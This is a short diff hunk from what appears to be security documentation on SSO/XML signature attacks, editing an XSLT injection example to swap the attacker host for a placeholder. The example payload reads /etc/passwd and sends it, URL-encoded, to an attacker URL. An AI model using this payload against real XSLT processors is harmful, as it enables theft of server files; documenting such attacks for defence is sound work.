@@ -174,7 +174,7 @@ Picture from [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_At
           <xsl:template match="doc">
             <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
             <xsl:variable name="escaped" select="encode-for-uri($file)"/>
-            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
+            <xsl:variable name="attackerUrl" select="'http://[ATTACKER.DOMAIN.TLD]/'"/>
             <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
             <xsl:value-of select="unparsed-text($exploitUrl)"/>
           </xsl:template>
